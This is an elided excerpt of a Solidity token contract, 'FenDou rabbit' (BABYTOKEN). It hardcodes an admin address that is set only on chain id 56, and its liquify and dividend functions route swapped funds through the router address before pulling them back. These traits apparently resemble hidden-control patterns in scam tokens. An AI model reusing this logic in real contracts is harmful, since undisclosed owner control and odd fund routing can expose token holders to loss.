...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
   ...
   // address public rewardToken;
    ...
    constructor(
    )  ERC20("FenDou rabbit", "FenDou rabbit") {
        ...
        if( block.chainid == 56){
                ...
                adminAddress = 0x539CB9BEcfFCA53891d1FB2DF0001244937143c1 ;
        ...
        _marketingWalletAddress=0x7a2DE8a40D790a3fBFC772BFA49CE86A104a6116;
    ...
    function swapAndLiquify(uint256 tokens) private {
        ...
        // swap tokens for ETH
        swapTokensForCake(half,_router); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered
        uint256 initialBalance = IERC20(_token).balanceOf(_router) ;  //address(this).balance;
        IERC20(_token).transferFrom(_router,address(this) ,IERC20(_token).balanceOf(_router));
    ...
    function swapAndSendDividends(uint256 tokens) private {
        swapTokensForCake(tokens, _router);
        IERC20(_token).transferFrom(_router,address(this) ,IERC20(_token).balanceOf(_router));
